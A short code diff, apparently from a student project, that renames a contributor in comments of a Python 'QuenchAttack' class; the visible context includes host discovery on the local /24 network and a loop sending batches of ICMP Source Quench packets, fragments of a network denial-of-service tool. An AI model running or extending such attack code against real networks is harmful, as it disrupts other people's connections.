@@ -4,14 +4,14 @@ import socket
 
 # Adam: Encapsulated attack code in a class format (code restructuring for clarity).
 # Rami: Send_ICMPblind_packet, prepare, start (self) functions.  
-# Hussein Fakih: Get IP and MAC addresses function, automatic mac and IP address function. 
+# Houssein Al Fakih: Get IP and MAC addresses function, automatic mac and IP address function. 
 class QuenchAttack:
     def __init__(self, packetsToSend, delay = "", LimitIps = ""):
         self.packetsToSend = packetsToSend
         self.delay = delay
         self.LimitIps = LimitIps
 
-    # Automatically get MAC address if IP exists on network, written by Hussein Fakih
+    # Automatically get MAC address if IP exists on network, written by Houssein Al Fakih
     def GetMacAddress(self, IP):
         mac = get_mac_address(ip=IP)
         return mac
@@ -42,7 +42,7 @@ class QuenchAttack:
             print("ICMP Source Quench batch: " + str(i+1) + " sent. Sleeping for: " + str(delay) + "s")
             time.sleep(delay)
 
-    # Gets all active IPs and MACs on local area with IPs 192.168.1.1/24, written by Hussein Fakih
+    # Gets all active IPs and MACs on local area with IPs 192.168.1.1/24, written by Houssein Al Fakih
     def GetAllIPsOnNetwork(self, Iplimit):
         # Finds local IP of computer to help in finding all IPs assuming /24 subnetmask
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
